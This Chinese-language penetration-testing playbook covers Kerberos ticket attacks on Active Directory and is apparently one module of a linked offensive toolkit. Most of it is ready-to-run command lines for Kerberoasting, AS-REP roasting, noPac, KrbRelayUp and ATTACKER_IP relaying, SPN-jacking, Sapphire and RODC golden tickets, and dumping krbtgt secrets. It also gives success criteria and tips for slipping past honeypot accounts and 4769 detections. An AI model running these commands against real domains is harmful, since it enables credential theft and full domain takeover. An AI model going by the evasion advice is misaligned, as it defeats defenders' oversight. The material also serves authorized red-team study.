# Kerberos 与票据攻击

> 适用：已握有域用户、MITM 位置或本地权限，需要把 Kerberos 认证面转成可复用凭据与票据的授权评估。

## 认什么

| 技术 | 入口判据 | 需要的权限位 |
|---|---|---|
| Kerberoasting | 任意域用户 + 存在 `servicePrincipalName=*` 账户 | 域用户 |
| AS-REP Roasting | 存在 `userAccountControl:...:=4194304`（不需预认证）账户 | 无需凭据 |
| Timeroasting | DC 的 NTP(UDP 123) 可达 | 无需凭据 |
| ASREQroast | 已处 MITM 位置（ARP/ICMP redirect/DHCPv6） | 无需凭据 |
| noPac (CVE-2021-42278/42287) | 低权限域用户 + MAQ>0 + 未打 KB5008102/KB5008380 | 域用户 |
| KrbRelayUp | 本地 SYSTEM + LDAP signing 未强制 | 本地管理员 |
| SPN-jacking | 对某账户有 WriteSPN + 环境已配 KCD | 域用户 |
| UnPAC-the-hash | 持有目标用户证书（.pfx/.pem） | 证书 |
| Bronze Bit (CVE-2020-17049) | 控制受限委派服务账号 + 目标在 Protected Users/sensitive | 服务账号 |
| Sapphire Ticket | 已有 krbtgt 的 NT + AES key | krbtgt hash |
| RODC 链 | `primaryGroupID=521`、`msDS-SecondaryKrbTgtNumber` | 视阶段 |

加密类型决定破解模式：RC4(eType 23)/AES256(18)/AES128(17) → hashcat 13100/19700/19600。

## 打哪（命令）

**Kerberoasting：SPN 枚举 → 请求票据 → 离线破解**

```bash
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -target-user svc_sql_admin
netexec ldap DC_IP -u user -p pass --kerberoasting tgs.txt
ldapsearch -H ldap://DC_IP -D "user@domain" -w pass -b "DC=domain,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName memberOf
setspn -T domain -Q */*          # 已在域内主机时
hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule   # RC4
hashcat -m 19700 tgs.txt wordlist.txt                        # AES256
```

**AS-REP Roasting（可无凭据）**

```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request
ldapsearch -H ldap://DC_IP -b "DC=domain,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

**Timeroasting / ASREQroast**

```bash
python3 timeroast.py DC_IP
netexec smb DC_IP -M timeroast
hashcat -m 31300 -a 0 -O sntp.txt wordlist.txt --username
Pcredz -i eth0 -v          # 或 -f pcap / -d 目录
hashcat -m 7500 asreq.txt wordlist.txt
```

**noPac（CVE-2021-42278 + CVE-2021-42287）**

```bash
noPac.py DOMAIN/USER:'PASS' -dc-ip DC_IP --impersonate Administrator -dump
noPac.py DOMAIN/USER:'PASS' -dc-ip DC_IP --impersonate Administrator -use-ldap -dump
```

手动链（自动化被拦时按步走）：

```bash
addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' -dc-ip DC_IP DOMAIN/USER:PASS
addspn.py --clear -t 'FAKEPC$' -u "DOMAIN/USER" -p PASS DC_IP
renameMachine.py -current-name 'FAKEPC$' -new-name DC_NAME -dc-ip DC_IP DOMAIN/USER:PASS
getTGT.py -dc-ip DC_IP "DOMAIN/DC_NAME:FakePass123"
renameMachine.py -current-name DC_NAME -new-name 'FAKEPC$' -dc-ip DC_IP DOMAIN/USER:PASS
export KRB5CCNAME=DC_NAME.ccache
getST.py -self -impersonate "Administrator" -altservice "cifs/DC_FQDN" -k -no-pass -dc-ip DC_IP "DOMAIN/DC_NAME"
secretsdump.py -k -no-pass -dc-ip DC_IP DC_FQDN
```

**KrbRelayUp / Bronze Bit / SPN-jacking**

```bash
KrbRelayUp.exe relay -Domain DOMAIN -CreateNewComputerAccount -ComputerName PC$ -ComputerPassword Pass
KrbRelayUp.exe spawn -m rbcd -d DOMAIN -dc DC_FQDN -cn PC$ -cp Pass
krbrelayx.py --target http://ADCS_FQDN/certsrv/ -ip ATTACKER_IP --victim TARGET_SAM --adcs --template Machine
mitm6 -i eth0 -d DOMAIN -hw TARGET_FQDN --relay ADCS_FQDN -v
getST.py -force-forwardable -spn TARGET_SPN -impersonate Administrator -hashes :NT_HASH DOMAIN/SVC
addspn.py --clear -t 'ServerB$' -u "DOMAIN/USER" -p PASS DC_IP
addspn.py -t 'ServerC$' --spn "cifs/serverB.DOMAIN" -u "DOMAIN/USER" -p PASS DC_IP
getST.py -spn "cifs/serverB.DOMAIN" -impersonate Administrator "DOMAIN/serverA$:PASS"
tgssub.py -in serverB.ccache -out final.ccache -altservice "cifs/serverC.DOMAIN"
```

**UnPAC-the-hash / Sapphire Ticket**

```bash
gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass PASS "DOMAIN/USER" tgt.ccache
getnthash.py -key AS_REP_KEY DOMAIN/USER
ticketer.py -request -impersonate domainadmin -domain DOMAIN -user USER -password PASS \
  -nthash KRBTGT_NT -aesKey KRBTGT_AES -user-id RID -domain-sid SID baduser
```

**RODC 攻击链**

```bash
ldapsearch -H ldap://DC_IP -b "DC=domain,DC=com" "(primaryGroupID=521)" dn sAMAccountName msDS-SecondaryKrbTgtNumber
nxc ldap DC_IP -u USER -p PASS -M rodc
keylistattack.py -rodcNo NUM -rodcKey AES -full "DOMAIN/USER:PASS@RODC"
keylistattack.py -rodcNo NUM -rodcKey AES -t TARGET_USER "DOMAIN/USER:PASS@RODC"
bloodyAD -d DOMAIN -u USER -p PASS --dc-ip DC_IP set object "RODC_DN" \
  msDS-RevealOnDemandGroup -v "CN=Domain Admins,CN=Users,DC=domain,DC=com"
Rubeus.exe golden /rodcNumber:NUM /aes256:AES /user:Administrator /id:500 /domain:DOMAIN /sid:SID /nowrap
```

**破解/票据到手之后**

```bash
netexec smb TARGETS -u svc_account -p 'cracked_pass'
impacket-secretsdump DOMAIN/svc_admin:pass@DC_IP
impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain DOMAIN -spn cifs/TARGET svc_account
setspn -a http/fake svc_account        # Targeted Kerberoasting
```

## 什么算成

- GetUserSPNs 落出 `$krb5tgs$23$`（或 17/18），hashcat 出明文口令，且该口令在 SMB/LDAP 认证成功
- GetNPUsers 落出 `$krb5asrep$`，`-m 18200` 出明文
- noPac 全链：拿到 DC 的 `cifs/DC_FQDN` 服务票据，`secretsdump -k -no-pass` 导出 krbtgt
- Timeroasting 出 SNTP hash 并破出计算机账户密码，`getTGT` 能取到票据
- RODC：keylistattack 输出目标账户 NT hash；或 RODC Golden Ticket 被可写 DC 接受
- Sapphire/伪造票据能通过 KDC 校验并访问目标服务（PAC 来自真实 S4U 结果）

## 假点

- 拿到 `$krb5tgs$` ≠ 拿下了：它只是离线破解的输入，破不出就得换目标账户或换路径
- 破解模式选错：AES 票据喂 `-m 13100` 永远破不出，先看 hash 前缀的 etype
- 强制 AES 环境下 RC4 请求被拒 ≠ 不能 Kerberoast：改请求 AES（慢约 10 倍但真实存在）
- AS-REP 枚举出候选但无 hash：该账户已开预认证，不构成 AS-REP 面
- noPac 半败：只补了一个 KB、MAQ=0、机器账户受策略限制 → S4U2self 拿不到 DC 票据
- S4U 报 `KDC_ERR_BADOPTION`：被模拟用户在 Protected Users 或标记 sensitive（换用户），或 SPN 与 DNS 不一致
- RODC Golden Ticket 的 kvno 必须匹配 RODC 的 krbtgt 版本；提交到可写 DC 时 PAC 会被重算
- 域里有 RODC ≠ 可打：先要 RODC 本地管理员或 krbtgt_XXXXX，才谈得上 keylist
- 蜜罐 SPN 账户：SPN 异常规整、图里孤立、近期无人登录 —— 请求前先比 BloodHound 数据
- 一次性枚举全部 SPN、集中时段请求票据会命中 4769 类检测（"大量 TGS 请求"本身就是常见检测点）

## 与其他包联动

- 前置侦察与决策树：`internal-01`；证书来源（ADCS/Shadow Credentials）→ `internal-03`；票据落地横向 → `internal-05`
- 落到手里的 hash/票据交给中继与投毒面：`internal-04`；云主机凭据先回 `internal-01` 再进本块
- 初始入口凭据来自 `web-auth-access`；首枪表见 `ck-router` 的 `../../ck-router/knowledge/战法索引-08-内网与域.md`
